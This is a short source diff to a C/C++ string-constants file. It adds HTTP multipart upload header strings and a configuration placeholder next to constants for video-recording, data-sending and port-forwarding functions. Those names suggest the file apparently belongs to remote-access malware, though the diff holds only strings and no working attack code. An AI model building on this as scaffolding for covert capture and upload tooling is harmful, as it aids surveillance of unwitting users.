@@ -5,6 +5,10 @@
 #include "StrConsts.h"
 #include "Config.h"
 #include "Crypt.h"
+#include "Crypt.h"
+
+#include "Modules.h"
+
 //---------------------------------------------------------------------------
 
 
@@ -61,6 +65,22 @@ CSSTR VideRecFuncStop[]           = "StopRec";
 CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
 CSSTR VideRecFuncSendData[]       = "StartSend";
 CSSTR VideRecFuncRunPortForward[] = "RunPortForward";
+
+
+CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
+CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
+CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
+CSSTR HTTPOctetStream[]            = "application/octet-stream";
+
+
+
+
+
+// Строки модуля AzConfig
+#ifdef AzConfigH
+	CSSTR AzConfigParamUserName[] = "%az_user%";
+#endif
+
 
 
 //=============================================================================
